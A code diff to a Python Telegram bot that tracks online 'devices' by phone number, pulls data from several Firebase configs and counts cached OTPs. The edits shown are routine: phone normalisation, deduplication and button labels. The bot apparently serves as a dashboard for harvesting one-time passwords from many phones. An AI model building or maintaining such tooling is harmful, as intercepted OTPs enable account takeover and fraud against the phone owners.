@@ -642,15 +642,26 @@ async def refresh_all():
         await asyncio.gather(*[_safe(cfg) for cfg in data["firebase_configs"]])
         last_refresh = now_dt().strftime("%H:%M:%S")
 
+# ══════════════════════════════════════════════════════════════════════════════
+# ✅ FIXED _normalize_phone() — +91 Hata Diya
+# ══════════════════════════════════════════════════════════════════════════════
 def _normalize_phone(ph: str) -> str:
     ph = str(ph).strip()
     digits = re.sub(r"[\s\-\.\(\)]", "", ph)
     pure = digits.lstrip("+")
-    if not pure.isdigit(): return ph
-    if len(pure) == 10 and pure[0] in "6789": return f"+91{pure}"
-    if len(pure) == 12 and pure.startswith("91"): return f"+{pure}"
-    if digits.startswith("+"): return digits
-    return f"+{pure}"
+    
+    if not pure.isdigit(): 
+        return ph
+        
+    # ✅ +91 ya 91 hata kar sirf 10 digit ka number return karo
+    if len(pure) == 12 and pure.startswith("91"):
+        return pure[2:]  
+    if len(pure) == 10:
+        return pure      
+    if digits.startswith("+"):
+        return digits.lstrip("+")
+        
+    return pure
 
 def count_online() -> int:
     return sum(1 for dm in device_cache.values() for d in dm.values() if d.get("online"))
@@ -661,11 +672,21 @@ def count_total() -> int:
 def count_otps() -> int:
     return sum(len(ol) for om in otp_cache.values() for ol in om.values())
 
+# ══════════════════════════════════════════════════════════════════════════════
+# ✅ FIXED all_online() — Duplicate aur No Number Hata Diya
+# ══════════════════════════════════════════════════════════════════════════════
 def all_online() -> list:
     res = []
+    seen_numbers = set()
+    
     for lb, dm in device_cache.items():
         for did, info in dm.items():
             if info.get("online"):
+                ph = info.get("phone") or "—"
+                # Agar number nahi hai ya pehle se list mein hai toh skip karo
+                if ph == "—" or not ph.strip() or ph in seen_numbers:
+                    continue
+                seen_numbers.add(ph)
                 res.append((lb, did, info))
     return res
 
@@ -800,21 +821,23 @@ def kb_back(page: str = "main_menu") -> InlineKeyboardMarkup:
     ]])
 
 # ══════════════════════════════════════════════════════════════════════════════
-# ✅ FIXED kb_online() — ID fallback hata diya, sirf number ya "No Number"
+# ✅ FIXED kb_online() — Neela dabba waisa hi, sirf number
 # ══════════════════════════════════════════════════════════════════════════════
 def kb_online(devices: list, page: int) -> InlineKeyboardMarkup:
     start = page * DEVICES_PER_PAGE
     chunk = devices[start:start+DEVICES_PER_PAGE]
     rows  = []
+    
     for i in range(0, len(chunk), 2):
         row = []
         for lb, did, info in chunk[i:i+2]:
             ph = info.get("phone") or "—"
-            ph_short = ph if (ph and ph != "—") else "No Number"
             esc  = lb.replace(":","_")
-            row.append(InlineKeyboardButton(f"🟢 {ph_short}",
-                                            callback_data=f"dev:{esc}:{did}:{page}"))
+            
+            # Neela dabba (🟢) waisa hi hai
+            row.append(InlineKeyboardButton(f"🟢 {ph}", callback_data=f"dev:{esc}:{did}:{page}"))
         rows.append(row)
+        
     nav, total = [], max(1,(len(devices)+DEVICES_PER_PAGE-1)//DEVICES_PER_PAGE)
     if page > 0:
         nav.append(InlineKeyboardButton("◀️", callback_data=f"online:{page-1}"))
@@ -2553,7 +2576,7 @@ async def auto_fetch(ctx: ContextTypes.DEFAULT_TYPE):
         for label, devs in device_cache.items():
             for dev_id, info in devs.items():
                 if not info.get("online"): continue
-                # ✅ Number nahi hai to group alert skip karo
+                # Number nahi hai to group alert skip karo
                 ph = info.get("phone") or "—"
                 if ph == "—" or not ph.strip():
                     continue
